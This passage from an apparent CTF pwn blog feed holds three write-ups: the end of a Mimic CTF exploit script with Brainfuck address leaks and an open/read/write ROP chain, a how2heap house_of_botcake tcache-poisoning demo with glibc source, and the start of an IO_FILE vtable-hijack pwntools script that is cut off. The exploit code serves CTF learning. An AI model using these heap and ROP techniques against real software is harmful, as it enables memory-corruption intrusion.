class="string">&#x27;+[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;,]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">pay += <span class="string">&#x27;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&#x27;</span>*<span class="number">2</span></span><br><span class="line">pay += <span class="string">&#x27;.&gt;&#x27;</span>*<span class="number">8</span></span><br><span class="line">pay += <span class="string">&#x27;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">pay += <span class="string">&#x27;.&gt;&#x27;</span>*<span class="number">8</span></span><br><span class="line">pay += <span class="string">&#x27;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&#x27;</span>*<span class="number">5</span></span><br><span class="line"></span><br><span class="line">pay += <span class="string">&#x27;.&gt;&#x27;</span>*<span class="number">8</span></span><br><span class="line">pay += <span class="string">&#x27;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&#x27;</span></span><br><span class="line">pay += <span class="string">&#x27;,&gt;&#x27;</span>*<span class="number">8</span> * <span class="number">22</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pay += &#x27;.&#x27;</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">dd = <span class="string">&#x27;0&#x27;</span>*<span class="number">0x40</span> + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">raw_input()</span><br><span class="line">p.send(dd)</span><br><span class="line"></span><br><span class="line">stack = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xf0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">pie = u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x854</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie))</span><br><span class="line"></span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x24083</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">one = [0xe3afe, 0xe3b01, 0xe3b04]</span></span><br><span class="line"><span class="string"># print(hex(libcbase + one[0]))</span></span><br><span class="line"><span class="string">p.sendline(p64(one[2]+libcbase))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rdi = libcbase + <span class="number">0x0000000000023b6a</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = libcbase + <span class="number">0x000000000002601f</span> <span class="comment"># pop rsi ; ret</span></span><br><span class="line">pop_rdx = libcbase + <span class="number">0x0000000000142c92</span> <span class="comment"># pop rdx ; ret</span></span><br><span class="line">op = libcbase + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">re = libcbase + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">wr = libcbase + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_rax=libcbase+libc.search(asm(<span class="string">&quot;pop rax\nret&quot;</span>)).<span class="built_in">next</span>()</span><br><span class="line">close=libcbase+libc.sym[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">syscall=libcbase+libc.search(asm(<span class="string">&quot;syscall\nret&quot;</span>)).<span class="built_in">next</span>()</span><br><span class="line">payload1=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(close)+p64(pop_rdi)</span><br><span class="line">payload+=p64(stack+<span class="number">8</span>*<span class="number">21</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">2</span>)+p64(syscall)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(stack+<span class="number">8</span>*<span class="number">21</span>)+p64(pop_rdx)+p64(<span class="number">0x50</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(re)+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(wr)+<span class="string">&#x27;flag\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Summary: This question is difficult for me. It is difficult to reverse the code and debug. After debugging for a long time, I actually feel that these two questions are very good, because some time ago, many competitions put the questions in the latest libc, because it is impossible in actual combat. When I encounter new libc, I rarely encounter libc in actual combat. Even if I encounter libc, the version is relatively old. However, the two questions in this competition have increased the amount of code (inverse vector). Such questions are closer to actual combat and can be enhanced. In fact, the reverse ability and code audit are not pwn. In this web question, they are closer to actual combat. I feel that future competitions will be closer to actual combat.</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2022-Strong-Network-Mimic-CTF-PWN-writeup&quot;&gt;&lt;a href=&quot;#2022-Strong-Network-Mimic-CTF-PWN-writeup&quot; class=&quot;headerlink&quot; title=&quot;2022 Stron</summary>
      
    
    
    
    <category term="pwn" scheme="https://jsjsj.top/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://jsjsj.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>house_of_botcake</title>
    <link href="https://jsjsj.top/2022/10/01/house-of-botcake/"/>
    <id>https://jsjsj.top/2022/10/01/house-of-botcake/</id>
    <published>2022-10-01T14:11:32.000Z</published>
    <updated>2023-10-04T06:35:18.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PWN-house-of-botcake"><a href="#PWN-house-of-botcake" class="headerlink" title="PWN house_of_botcake"></a>PWN house_of_botcake</h1><h1 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h1><p>In the DASCTF October competition, there was an inspection of house_of_botcake. I thought it was very strange at the time. I had never used this method before, so I went to how2heap to learn it. It was actually very simple, not as complicated as I imagined.</p><p>Let’s rely on the source code analysis wave</p><p>house_of_botcake.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This attack only relies on double free.\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The address we want malloc() to return, namely,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Preparing heap layout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Allocating a chunk for later consolidation: prev @ %p\n&quot;</span>, prev);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Allocating the victim chunk: a @ %p\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we have the chunk overlapping primitive:&quot;</span>);</span><br><span class="line">    <span class="type">int</span> prev_size = prev[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line">    <span class="type">int</span> a_size = a[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prev @ %p, size: %#x, end @ %p\n&quot;</span>, prev, prev_size, (<span class="type">void</span> *)prev+prev_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;victim @ %p, size: %#x, end @ %p\n&quot;</span>, a, a_size, (<span class="type">void</span> *)a+a_size);</span><br><span class="line">    a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">    prev[<span class="number">0x110</span>/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>)] = <span class="number">0x41414141</span>;</span><br><span class="line">    assert(a[<span class="number">0</span>] == <span class="number">0x41414141</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>According to the adaptation demo of a master on the Internet:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="type">size_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) x[i] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="type">size_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="type">size_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//padding chunk or will double free</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">free</span>(x[i]);</span><br><span class="line">    <span class="built_in">free</span>(a);  <span class="comment">// a in unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);  <span class="comment">// a in tcache</span></span><br><span class="line">    <span class="type">size_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0xb0</span>);</span><br><span class="line">    b[<span class="number">0x90</span>/<span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = (<span class="type">size_t</span>)((<span class="type">long</span>)stack_var ^ ((<span class="type">long</span>)a &gt;&gt; <span class="number">12</span>));<span class="comment">// poison tcache</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="type">size_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    assert(c == stack_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>C demo idea: first apply for 7 chunks to fill up tc, then apply for 2 chunks for triggering, and a chunk for isolating the top to prevent overwriting the top chunk</p><p>  Then free the first 7 chunks in turn, enter tc, free a chunk again, enter the unsorted bin, and then free a chunk in front of the unsort bin, which will be merged and merged.</p><p>Apply for a chunk again. At this time, it will be applied from tc. After the application is released, tc will be reduced from 7 to 6. At this time, you will free the chunk that has just entered the unsortbin and enter tc. At this time, you can use the bypass key. In fact, this method It is to let the chunk enter the unsortbin first, and then let the unsortbin chunk enter the tc, so that the tc key can be bypassed, and the following can be arbitrarily written and hijacked</p><p>tchace key source code:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">  <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">  <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">     trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">     2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">     coincidence before aborting.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_entry *tmp;</span><br><span class="line">      LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">      <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">       tmp;</span><br><span class="line">       tmp = tmp-&gt;next)</span><br><span class="line">        <span class="keyword">if</span> (tmp == e)</span><br><span class="line">      malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">      <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">         few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>If a chunk is freed into tc, it will detect the value of the key. If it is the same, it will traverse and detect the same address. If there is the same address, it will trigger double free. At this time, we can let it enter the unsortbin first. At this time, the value of the key is not equal. , and then arbitrarily hijacking double free will not report the error “free(): double free detected in tcache 2”. At this time, other methods are used, such as: off-by-one&#x2F;null heap overflow or UAF coverage bk reaches any hijacked operation<br>The final effect:<br>![730JX508C])$FK@THV85]IK.png]<a href="http://azly.top/usr/uploads/2022/10/769705769.png">1</a></p><p>Summary: I am preparing for the provincial competition recently, and I have read very little knowledge about pwn, woohoo, after the provincial competition, I will all devote myself to PWN, NO PWN NO FUN!!!!!</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PWN-house-of-botcake&quot;&gt;&lt;a href=&quot;#PWN-house-of-botcake&quot; class=&quot;headerlink&quot; title=&quot;PWN house_of_botcake&quot;&gt;&lt;/a&gt;PWN house_of_botcake&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="pwn" scheme="https://jsjsj.top/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://jsjsj.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>PWN IOfile simple record</title>
    <link href="https://jsjsj.top/2022/08/03/PWN%20IOfile%20simple%20record/"/>
    <id>https://jsjsj.top/2022/08/03/PWN%20IOfile%20simple%20record/</id>
    <published>2022-08-03T13:47:08.000Z</published>
    <updated>2023-10-04T06:35:38.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PWN-IOfile-simple-record-1"><a href="#PWN-IOfile-simple-record-1" class="headerlink" title="PWN IOfile simple record (1)"></a>PWN IOfile simple record (1)</h1><p>PWN IO getc discussion</p><p>When getc will make _IO_buf_base empty, go to _IO_doallocbuf when it is empty</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">scanf:</span><br><span class="line"> if (fp-&gt;_IO_buf_base == NULL)</span><br><span class="line">   &#123;</span><br><span class="line">     /* Maybe we already have a push back pointer.  */</span><br><span class="line">     if (fp-&gt;_IO_save_base != NULL)</span><br><span class="line">&#123;</span><br><span class="line">  free (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">     _IO_doallocbuf (fp);</span><br><span class="line">   &#125;</span><br><span class="line"> _IO_doallocbuf:</span><br><span class="line">void_IO_doallocbuf (_IO_FILE *fp)&#123;  if (fp-&gt;_IO_buf_base) # How to input buffer is not empty, return directly    return;  </span><br><span class="line">if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; 0) #check flag</span><br><span class="line">if (_IO_DOALLOCATE (fp) != EOF) ## call vtable function     return;  _</span><br><span class="line">IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+1, 0);&#125;</span><br><span class="line">libc_hidden_def (_IO_doallocbuf)</span><br></pre></td></tr></table></figure><p>_IO_doallocbuf：</p><p>Then trigger vtable to complete any hijacking, this question has a backdoor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./chall&#x27;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">io = process(binary, aslr = <span class="number">1</span>)</span><br><span class="line"><span class="comment">#$io = remote(&#x27;127.0.0.1&#x27;, 30001)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">myu64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">idx</span>):</span><br><span class="line">    <span class="comment"># io.recvuntil(&#x27;choice: &#x27;)</span></span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make</span>(<span class="params">sz, d, idx=<span class="number">0</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;data: &quot;</span>)</span><br><span class="line">    io.sendline(d)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">make(<span class="number">0x500</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">make(<span class="number">0x500</span>, <span class="string">&#x27;b&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">make(<span class="number">0x500</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;your buf: &quot;</span>)</span><br><span class="line">libc_addr = myu64(io.recvn(<span class="number">6</span>)) &amp; ((<span class="number">1</span>&lt;&lt;<span class="number">64</span>) - <span class="number">1</span> - <span class="number">0xff</span>)</span><br><span class="line"><span class="keyword">if</span> libc_addr &amp; <span class="number">0xf000</span> != <span class="number">0</span>:</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">stdin_addr = libc_addr - <span class="number">0x160</span></span><br><span class="line">libc_base = libc_addr - <span class="number">0x219c00</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span 